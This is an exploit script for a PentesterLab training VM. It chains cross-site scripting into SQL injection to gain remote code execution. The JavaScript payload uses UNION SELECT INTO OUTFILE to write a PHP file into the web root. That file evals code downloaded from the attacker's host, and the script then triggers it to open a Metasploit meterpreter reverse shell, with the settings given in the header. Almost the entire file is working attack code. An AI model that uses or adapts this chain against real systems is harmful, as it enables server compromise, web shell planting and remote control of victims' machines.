/*

Exploit Title       : XSS->SQL RCE Exploit Chain
Author              : wetw0rk
Vulnerable Software : https://pentesterlab.com/exercises/xss_and_mysql_file/iso

Usage               : XSS and SQL injection exploit chain for RCE. When using this,
                      you may have to manually set the document.cookie using the console.
                      On FireFox go to Web Developer -> Developer Toolbar -> Console) 
                      Note that in a real scenario xhr.withCredentials() would execute on
                      the fly when the admin reaches the page, this VM is just buggy.

Current Payload (Using Metasploit):

  ```
  use exploit/multi/script/web_delivery
  set TARGET PHP
  set PAYLOAD php/meterpreter/reverse_tcp
  set URIPATH /
  set SRVPORT 9
  set LHOST 192.168.245.171
  set LPORT 90
  ```

*/

<script>

function trigger(rhost, payload_name)
{
  var xhr = new XMLHttpRequest();
  xhr.open("GET", `http://${rhost}/css/${payload_name}`);
  xhr.send();
}

function exploit(rhost, payload, payload_name)
{
  var injection = `4 UNION SELECT 1,2,3, "${payload}" INTO OUTFILE "/var/www/css/${payload_name}"`;
  var target    = `http://${rhost}/admin/edit.php?id=${injection}`;

  var xhr = new XMLHttpRequest();

  xhr.open("GET", target);
  xhr.withCredentials = true;

  xhr.send();
}

var payload = "<?php eval(file_get_contents('http://192.168.245.171:9/ic5RPEiMKrJxM'));?>";
var payload_name = "wetw0rk.php";
var rhost = "192.168.245.173";

exploit(rhost, payload, payload_name);
trigger(rhost, payload_name);

</script>
